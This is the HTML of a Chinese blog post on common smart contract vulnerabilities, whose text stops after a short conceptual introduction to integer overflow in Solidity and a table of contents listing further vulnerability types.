@@ -1,0 +1,1175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>智能合约常见漏洞 | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="整型溢出漏洞用书上的例子来介绍一下：一个小朋友，他可以数着手指运算十以内的运算，比如 1+1&#x3D;2，他可以用两个手指算出来，但是如果你问他 5+6 等于多少，他数完十个手指之后发现手指不够用了，就会把手指扳回来，说：结果为 1，对于小朋友来说，这个问题就超纲“溢出”了 在 solidity 中，当一个整型变量高于或者低于他所能承受的范围时，就会发生溢出，导致一些不可预期的情况出现。例如，当用户转账金">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约常见漏洞">
+<meta property="og:url" content="https://yichen115.github.io/2020/04/27/moa35g/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="整型溢出漏洞用书上的例子来介绍一下：一个小朋友，他可以数着手指运算十以内的运算，比如 1+1&#x3D;2，他可以用两个手指算出来，但是如果你问他 5+6 等于多少，他数完十个手指之后发现手指不够用了，就会把手指扳回来，说：结果为 1，对于小朋友来说，这个问题就超纲“溢出”了 在 solidity 中，当一个整型变量高于或者低于他所能承受的范围时，就会发生溢出，导致一些不可预期的情况出现。例如，当用户转账金">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587977523646-f6f1714e-8932-4933-9592-c8fd8f826dfa.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=123608&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587977681693-6f6cb5e8-39d9-4f1b-a31d-19778c59aa6b.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1920&size=177661&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587978860772-a707e20d-3dfc-47ce-9f19-260050de3078.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=941&originWidth=1920&size=174373&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587978982095-1851e990-2623-44a4-8e62-43b52ccaee7a.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=444&size=7931&status=done&style=stroke&width=380">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587978963350-a5376c7a-a3b5-4e48-8c12-2f9f926cc207.png#align=left&display=inline&height=160&margin=%5Bobject%20Object%5D&name=image.png&originHeight=179&originWidth=424&size=7161&status=done&style=stroke&width=378">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587979051634-3810f23d-77fc-43b6-8c56-d7ef2b4dd429.png#align=left&display=inline&height=195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=235&originWidth=455&size=12667&status=done&style=stroke&width=377">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587979125819-a5107b0f-0cfa-44df-bc16-af8b3916b203.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=image.png&originHeight=181&originWidth=448&size=7939&status=done&style=stroke&width=392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588123839849-8145faef-3c2c-49dd-9b8d-c79f0aab2edb.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&originHeight=330&originWidth=508&size=0&status=done&style=stroke&width=508">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587995917188-50b175cc-3a42-462f-88f6-328725058a66.png#align=left&display=inline&height=318&margin=%5Bobject%20Object%5D&originHeight=665&originWidth=800&size=0&status=done&style=stroke&width=382">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121095109-0b19a25c-ce34-452d-9d46-b33e75a91009.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=158781&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121181253-2b8c6c29-dbc3-4273-a150-ef957d536d82.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=163260&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121302322-fe9130a7-ea93-443a-8bb1-409dd5a8034b.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1920&size=160030&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588121584303-22382d72-a52c-4475-899d-2b4c712cda5d.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=164637&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588122269248-1c0c78f3-52ff-4fc4-ad10-78fdebfc7dd3.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1920&size=173090&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588169875514-148e07a8-0b0f-4fdb-a304-7eb96e9c3492.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=170642&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588170122418-74341ac8-7d1c-4793-8d46-b6a0900ea0d9.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1920&size=173851&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588170328652-c0faae85-ea57-4c53-85b1-2fc625c62742.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=165930&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218331646-f32fc00f-4381-4730-973a-593b18bc4234.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1920&size=161680&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218429113-7c233cc9-4b2d-40b9-957b-e58dbf5e0272.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1920&size=172940&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218467106-d7c768fa-ba09-4a9a-ba1d-e656840d2e93.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=175812&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588218525391-e4064c67-413c-4f50-9c37-07129e514e41.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=954&originWidth=1920&size=182568&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253058296-0386e04f-ea4e-4a52-a368-9a917623a136.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=image.png&originHeight=939&originWidth=1920&size=151907&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253108925-4ef4eb81-ffa7-4a67-a62e-88fadd01eaf5.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=941&originWidth=1920&size=165012&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253720491-99f3592e-6def-43b7-b25a-303c028a4c8e.png#align=left&display=inline&height=322&margin=%5Bobject%20Object%5D&name=image.png&originHeight=643&originWidth=962&size=69417&status=done&style=stroke&width=481">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253870482-2cb3ce13-0815-4d26-8ee0-fc3dfd254e8f.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=941&originWidth=1920&size=178469&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588253951709-23ecbec6-fb87-403f-9f0f-9df00da26e2b.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1920&size=169202&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588257569720-4458e343-caf4-4286-8239-e21c88e18edd.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=146076&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588257665419-7b43279e-acea-49db-8cf5-2f00d802664b.png#align=left&display=inline&height=367&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=150267&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588257837637-2910658a-bf06-41ed-97a1-b55f1190665f.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=153877&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588258180681-093ceb73-c73e-41b4-9092-c48e716366ad.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=157973&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588258347758-3f0f1646-e299-4d47-b3f3-f50fccf67af7.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1920&size=179651&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588643515734-3d74b02e-8cb6-4535-a17b-825ac5d05835.png#align=left&display=inline&height=388&margin=%5Bobject%20Object%5D&name=image.png&originHeight=841&originWidth=1617&size=85844&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588643221117-3b26649c-3549-43d1-b24e-cf4e4c0a8917.png#align=left&display=inline&height=435&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1620&size=87123&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588378994573-c701dcbe-7fe2-45a9-999e-2ccc4a53483e.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1920&size=157848&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588645372992-d62aedd5-1250-4cfd-95cd-ede2b11b34a6.png#align=left&display=inline&height=238&margin=%5Bobject%20Object%5D&name=image.png&originHeight=498&originWidth=1560&size=739121&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588379993181-839b50ba-8560-463a-b234-aff36e8167e3.png#align=left&display=inline&height=352&margin=%5Bobject%20Object%5D&name=image.png&originHeight=896&originWidth=1898&size=1232053&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646600930-140704bf-5b1b-4166-a456-253e06494cb5.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=867&originWidth=1898&size=1609280&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646718162-ebf7def7-f5ae-4f0e-8fc5-9554c48f266b.png#align=left&display=inline&height=57&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=905&size=78303&status=done&style=none&width=644">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646776245-072f5eca-7c00-4ae3-b8b9-03e49d7a09e7.png#align=left&display=inline&height=371&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1898&size=1764803&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588646869086-7a796007-ac54-41da-bd5b-2e5b8cab751a.png#align=left&display=inline&height=78&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=1447&size=33541&status=done&style=stroke&width=724">
+<meta property="og:image" content="https://blog.csdn.net/TurkeyCock/article/details/84061796">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588897744240-3c81ecb7-8d70-44e4-8dda-b7dec1ac9bfd.png#align=left&display=inline&height=73&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=484&size=50202&status=done&style=none&width=333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588897787674-48673cea-d4f8-4f86-8e01-7c86438e71cb.png#align=left&display=inline&height=88&margin=%5Bobject%20Object%5D&name=image.png&originHeight=185&originWidth=1560&size=391482&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657166028-e0c4896e-7f23-49c1-b849-c0cc64165d8e.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&name=image.png&originHeight=557&originWidth=453&size=37870&status=done&style=stroke&width=288">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657264285-95806606-5411-4061-8f1e-96c0ccfecf70.png#align=left&display=inline&height=424&margin=%5Bobject%20Object%5D&name=image.png&originHeight=776&originWidth=425&size=52435&status=done&style=stroke&width=232">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657336003-b4585fed-8ce4-4e2e-834c-f1d5baac6717.png#align=left&display=inline&height=137&margin=%5Bobject%20Object%5D&name=image.png&originHeight=191&originWidth=648&size=17982&status=done&style=stroke&width=466">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657562814-05cad950-d184-47d6-9429-a6c5dfbfd258.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=676&originWidth=451&size=41611&status=done&style=stroke&width=196">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588657607628-5c32c4a8-f04f-4764-a4f3-de01ab285607.png#align=left&display=inline&height=324&margin=%5Bobject%20Object%5D&name=image.png&originHeight=647&originWidth=450&size=43876&status=done&style=stroke&width=225">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588977793467-3d11140c-ff19-4ceb-b867-bb88489638fb.png#align=left&display=inline&height=42&margin=%5Bobject%20Object%5D&name=image.png&originHeight=87&originWidth=1560&size=200742&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588977951913-203f4fc1-62b7-42c9-8ea7-5fe234a53c8d.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=187&originWidth=1560&size=403019&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588425934454-7157ab96-fca1-4f79-b9e0-95638abe3920.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=938&originWidth=1920&size=187946&status=done&style=stroke&width=746">
+<meta property="article:published_time" content="2020-04-27T05:57:56.000Z">
+<meta property="article:modified_time" content="2020-07-16T12:42:33.684Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1587977523646-f6f1714e-8932-4933-9592-c8fd8f826dfa.png#align=left&display=inline&height=366&margin=%5Bobject%20Object%5D&name=image.png&originHeight=943&originWidth=1920&size=123608&status=done&style=stroke&width=746">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">智能合约常见漏洞</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">智能合约常见漏洞</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-04-27T05:57:56.000Z" itemprop="datePublished" class="page-time">
+  2020-04-27
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#整型溢出漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">整型溢出漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码片段"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">代码片段</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">代码调试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#规避整型溢出：SafeMath-库"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">规避整型溢出：SafeMath 库</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#重入漏洞"><span class="post-toc-number">2.</span> <span class="post-toc-text">重入漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析-1"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#以太坊支付通道及提款机制"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">以太坊支付通道及提款机制</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#常用转币方式"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">常用转币方式</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-1"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">代码调试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防范"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">漏洞防范</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#访问控制缺陷"><span class="post-toc-number">3.</span> <span class="post-toc-text">访问控制缺陷</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析-2"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-2"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">代码调试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防范-1"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">漏洞防范</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#特权功能暴露"><span class="post-toc-number">4.</span> <span class="post-toc-text">特权功能暴露</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析-3"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码片段-1"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">代码片段</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-3"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">代码调试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防范-2"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">漏洞防范</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#跨合约调用漏洞"><span class="post-toc-number">5.</span> <span class="post-toc-text">跨合约调用漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">漏洞概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析-4"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">漏洞分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-4"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">代码调试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防范-3"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">漏洞防范</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#拒绝服务漏洞"><span class="post-toc-number">6.</span> <span class="post-toc-text">拒绝服务漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述-1"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">漏洞概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析-5"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#在外部操纵映射或数组循环"><span class="post-toc-number">6.2.1.</span> <span class="post-toc-text">在外部操纵映射或数组循环</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#所有者合约"><span class="post-toc-number">6.2.2.</span> <span class="post-toc-text">所有者合约</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基于外部调用的进展状态"><span class="post-toc-number">6.2.3.</span> <span class="post-toc-text">基于外部调用的进展状态</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-5"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">代码调试</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防范-4"><span class="post-toc-number">6.4.</span> <span class="post-toc-text">漏洞防范</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#矿工特权隐患"><span class="post-toc-number">7.</span> <span class="post-toc-text">矿工特权隐患</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述-2"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">漏洞概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#相关案例"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">相关案例</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#短地址攻击"><span class="post-toc-number">8.</span> <span class="post-toc-text">短地址攻击</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ABI-编码"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">ABI 编码</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述-3"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">漏洞概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-6"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">代码调试</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#再次尝试"><span class="post-toc-number">8.3.1.</span> <span class="post-toc-text">再次尝试</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞防范-5"><span class="post-toc-number">8.4.</span> <span class="post-toc-text">漏洞防范</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#tx-origin-漏洞"><span class="post-toc-number">9.</span> <span class="post-toc-text">tx.origin 漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞概述-4"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">漏洞概述</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#代码调试-7"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">代码调试</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-moa35g"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">智能合约常见漏洞</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-04-27 13:57:56" datetime="2020-04-27T05:57:56.000Z"  itemprop="datePublished">2020-04-27</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="整型溢出漏洞"><a href="#整型溢出漏洞" class="headerlink" title="整型溢出漏洞"></a>整型溢出漏洞</h1><p>用书上的例子来介绍一下：<br>一个小朋友，他可以数着手指运算十以内的运算，比如 1+1=2，他可以用两个手指算出来，但是如果你问他 5+6 等于多少，他数完十个手指之后发现手指不够用了，就会把手指扳回来，说：结果为 1，对于小朋友来说，这个问题就超纲“溢出”了</p>
+<p>在 solidity 中，当一个整型变量高于或者低于他所能承受的范围时，就会发生溢出，导致一些不可预期的情况出现。例如，当用户转账金额超过系统预设的最大值时，只要用户金额大于零，用户就可以直接将巨额的代币转走</p>
